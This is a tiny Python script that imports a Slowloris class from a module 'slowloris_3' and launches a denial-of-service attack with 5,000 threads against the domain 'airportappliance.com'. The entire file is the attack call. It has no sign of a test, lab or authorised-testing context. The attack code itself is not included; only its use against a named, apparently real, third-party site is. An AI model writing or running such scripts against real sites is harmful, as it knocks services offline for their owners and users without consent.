from slowloris_3 import Slowloris

NUM_OF_THREADS = 5000

slowloris = Slowloris("airportappliance.com")
slowloris.attack(NUM_OF_THREADS)
